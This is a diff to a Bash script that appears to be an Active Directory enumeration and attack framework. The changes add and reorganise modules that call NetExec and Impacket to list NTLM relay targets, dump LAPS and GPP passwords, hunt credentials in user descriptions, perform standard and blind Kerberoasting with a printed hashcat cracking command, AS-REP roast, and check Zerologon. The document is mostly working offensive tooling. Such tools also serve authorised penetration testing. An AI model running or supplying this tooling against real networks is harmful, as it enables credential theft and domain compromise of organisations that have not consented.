@@ -2,7 +2,6 @@
 set -euo pipefail
 
 readonly VERSION="1.0.0"
-readonly TOOL_NAME="ADPulse"
 
 readonly C_G="\e[32m" C_R="\e[31m" C_Y="\e[33m"
 readonly C_C="\e[36m" C_M="\e[35m" C_B="\e[1m" C_N="\e[0m"
@@ -21,7 +20,6 @@ show_banner() {
 EOF
     echo -e "  v${VERSION}${C_N}"
     echo -e "  ${C_M}Active Directory Enumeration Framework${C_N}"
-    echo -e "  ${C_M}github.com/redblue-frank/adpulse${C_N}"
     echo
 }
 
@@ -122,18 +120,43 @@ mod_reachability() {
     run nxc ldap  "$DOMAIN" --port 389   || true
     run nxc winrm "$DOMAIN"              || true
     run nxc rdp   "$DOMAIN"              || true
-    [[ "$AUTH_MODE" == "creds" ]] && run nxc mssql "$DCIP" -u "$USER" -p "$PASS" || true
+    [[ "$AUTH_MODE" == "creds" ]] && { run nxc mssql "$DCIP" -u "$USER" -p "$PASS" || true; }
+}
+
+mod_smb_signing() {
+    sub_banner "SMB Signing Check"
+    run nxc smb "$DOMAIN" --gen-relay-list "${OUTDIR}/relay_targets.txt" || true
+    if [[ -s "${OUTDIR}/relay_targets.txt" ]]; then
+        warn "Hosts with SMB signing disabled → ${OUTDIR}/relay_targets.txt"
+        info "Vulnerable to NTLM relay attacks"
+    else
+        ok "All hosts enforce SMB signing"
+    fi
 }
 
 mod_users() {
     require_auth || return
     sub_banner "RID Brute-Force"
     run nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --rid-brute \
-        | grep 'SidTypeUser' | tee -a "$LOGFILE"
+        | grep 'SidTypeUser' | tee -a "$LOGFILE" "${OUTDIR}/rid_users.txt"
     sub_banner "LDAP User Dump"
     run nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" --users \
         | tee "${OUTDIR}/ldap_users.txt"
     ensure_users
+}
+
+mod_pass_pol() {
+    require_auth || return
+    sub_banner "Password Policy"
+    run nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --pass-pol \
+        | tee "${OUTDIR}/password_policy.txt"
+}
+
+mod_user_desc() {
+    require_auth || return
+    sub_banner "User Descriptions"
+    run nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" -M get-desc-users \
+        | tee "${OUTDIR}/user_descriptions.txt"
 }
 
 mod_shares() {
@@ -155,11 +178,39 @@ mod_adcs() {
     fi
 }
 
+mod_laps() {
+    require_auth || return
+    sub_banner "LAPS Passwords"
+    run nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" -M laps \
+        | tee "${OUTDIR}/laps.txt"
+}
+
+mod_delegation() {
+    require_auth || return
+    sub_banner "Delegation Enumeration"
+    run nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" --find-delegation \
+        | tee "${OUTDIR}/delegation.txt"
+}
+
+mod_trusts() {
+    require_auth || return
+    sub_banner "Domain Trusts"
+    run nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" -M enum_trusts \
+        | tee "${OUTDIR}/domain_trusts.txt"
+}
+
 mod_pre2k() {
     require_auth || return
     sub_banner "Pre-Windows 2000 Accounts"
     run nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" -M pre2k \
         | tee "${OUTDIR}/pre2k.txt"
+}
+
+mod_gpp() {
+    require_auth || return
+    sub_banner "GPP Passwords & AutoLogon"
+    run nxc smb "$DOMAIN" -u "$USER" -p "$PASS" -M gpp_autologin || true
+    run nxc smb "$DOMAIN" -u "$USER" -p "$PASS" -M gpp_password  || true
 }
 
 mod_zerologon() {
@@ -170,13 +221,6 @@ mod_zerologon() {
     [[ "${confirm,,}" == "y" ]] || { info "Skipped"; return; }
     run nxc smb "$DOMAIN" -u "$USER" -p "$PASS" -M zerologon \
         | tee "${OUTDIR}/zerologon.txt"
-}
-
-mod_gpp() {
-    require_auth || return
-    sub_banner "GPP AutoLogon"
-    run nxc smb "$DOMAIN" -u "$USER" -p "$PASS" -M gpp_autologin \
-        | tee "${OUTDIR}/gpp_autologon.txt"
 }
 
 mod_bloodhound() {
@@ -198,7 +242,8 @@ mod_bloodhound() {
 
 mod_kerberoast() {
     require_auth || return
-    sub_banner "Kerberoasting"
+    ensure_users
+    sub_banner "Kerberoasting (standard)"
     local hf="${OUTDIR}/kerb_hashes.txt"
     run GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip "$DCIP" -request -outputfile "$hf" || true
     if [[ -s "$hf" ]]; then
@@ -207,18 +252,14 @@ mod_kerberoast() {
     else
         warn "No Kerberoastable SPNs found"
     fi
-}
 
-mod_blind_kerberoast() {
-    require_auth || return
-    ensure_users
-    sub_banner "Blind Kerberoasting"
-    local hf="${OUTDIR}/blind_kerb_hashes.txt"
+    sub_banner "Kerberoasting (blind / no pre-auth)"
+    local bhf="${OUTDIR}/blind_kerb_hashes.txt"
     run GetUserSPNs.py "$DOMAIN/" -usersfile "$USERS_FILE" -dc-host "$DCIP" \
-        -no-preauth -outputfile "$hf" || true
-    if [[ -s "$hf" ]]; then
-        ok "Hashes → $hf"
-        info "hashcat -m 13100 '$hf' /usr/share/wordlists/rockyou.txt"
+        -no-preauth -outputfile "$bhf" || true
+    if [[ -s "$bhf" ]]; then
+        ok "Blind hashes → $bhf"
+        info "hashcat -m 13100 '$bhf' /usr/share/wordlists/rockyou.txt"
     else
         warn "No blind Kerberoastable accounts"
     fi
@@ -241,10 +282,17 @@ mod_asrep() {
 
 mod_run_all() {
     banner "FULL ENUMERATION (Zerologon excluded)"
+
     mod_reachability
-    mod_shares
+    mod_smb_signing
     mod_users
+    mod_pass_pol
+    mod_user_desc
+    mod_shares
+    mod_delegation
+    mod_trusts
     mod_pre2k
+    mod_laps
     mod_adcs
     mod_gpp
 
@@ -256,7 +304,6 @@ mod_run_all() {
     [[ -f "$zip" ]] && cp "$zip" "$OUTDIR/" && ok "BloodHound ZIP collected"
 
     mod_kerberoast
-    mod_blind_kerberoast
     mod_asrep
 
     banner "ENUMERATION COMPLETE"
@@ -271,11 +318,13 @@ menu_anon() {
         echo
         echo -e "${C_B}===== ANONYMOUS MODE =====${C_N}"
         echo " 1) Protocol Reachability"
+        echo " 2) SMB Signing (relay targets)"
         echo " 0) Exit"
         echo
         read -rp $'\e[33m[?] Option: \e[0m' opt
         case "$opt" in
             1) mod_reachability ;;
+            2) mod_smb_signing  ;;
             0) ok "Done."; exit 0 ;;
             *) warn "Invalid" ;;
         esac
@@ -286,36 +335,58 @@ menu_auth() {
     while true; do
         echo
         echo -e "${C_B}===== ENUMERATION MENU =====${C_N}"
+        echo
+        echo -e " ${C_C}--- Recon ---${C_N}"
         echo "  1) Protocol Reachability"
-        echo "  2) User Enumeration (RID + LDAP)"
-        echo "  3) SMB Shares"
-        echo "  4) ADCS Check"
-        echo "  5) Pre-Windows 2000 Accounts"
-        echo "  6) Zerologon"
-        echo "  7) GPP AutoLogon"
-        echo "  8) BloodHound Collection"
-        echo "  9) Kerberoasting"
-        echo " 10) Blind Kerberoasting"
-        echo " 11) AS-REP Roasting"
-        echo " 12) RUN ALL"
+        echo "  2) SMB Signing (relay targets)"
+        echo "  3) Password Policy"
+        echo
+        echo -e " ${C_C}--- Users & Credentials ---${C_N}"
+        echo "  4) User Enumeration (RID + LDAP)"
+        echo "  5) User Descriptions (cred hunting)"
+        echo
+        echo -e " ${C_C}--- Shares & Policies ---${C_N}"
+        echo "  6) SMB Shares"
+        echo "  7) GPP Passwords & AutoLogon"
+        echo "  8) LAPS Passwords"
+        echo
+        echo -e " ${C_C}--- AD Configuration ---${C_N}"
+        echo "  9) Delegation (unconstrained/constrained/RBCD)"
+        echo " 10) Domain Trusts"
+        echo " 11) Pre-Windows 2000 Accounts"
+        echo " 12) ADCS (Certificate Services)"
+        echo
+        echo -e " ${C_C}--- Attack ---${C_N}"
+        echo " 13) Kerberoasting (standard + blind)"
+        echo " 14) AS-REP Roasting"
+        echo " 15) Zerologon (CVE-2020-1472)"
+        echo
+        echo -e " ${C_C}--- Collection ---${C_N}"
+        echo " 16) BloodHound Ingest"
+        echo " 17) RUN ALL (excludes Zerologon)"
         echo "  0) Exit"
         echo
         read -rp $'\e[33m[?] Option: \e[0m' opt
         case "$opt" in
-            1)  mod_reachability      ;;
-            2)  mod_users             ;;
-            3)  mod_shares            ;;
-            4)  mod_adcs              ;;
-            5)  mod_pre2k             ;;
-            6)  mod_zerologon         ;;
-            7)  mod_gpp               ;;
-            8)  mod_bloodhound        ;;
-            9)  mod_kerberoast        ;;
-            10) mod_blind_kerberoast  ;;
-            11) mod_asrep             ;;
-            12) mod_run_all           ;;
-            0)  ok "Done."; exit 0    ;;
-            *)  warn "Invalid"        ;;
+            1)  mod_reachability  ;;
+            2)  mod_smb_signing   ;;
+            3)  mod_pass_pol      ;;
+            4)  mod_users         ;;
+            5)  mod_user_desc     ;;
+            6)  mod_shares        ;;
+            7)  mod_gpp           ;;
+            8)  mod_laps          ;;
+            9)  mod_delegation    ;;
+            10) mod_trusts        ;;
+            11) mod_pre2k         ;;
+            12) mod_adcs          ;;
+            13) mod_kerberoast    ;;
+            14) mod_asrep         ;;
+            15) mod_zerologon     ;;
+            16) mod_bloodhound    ;;
+            17) mod_run_all       ;;
+            0)  ok "Done."; exit 0 ;;
+            *)  warn "Invalid" ;;
         esac
     done
 }
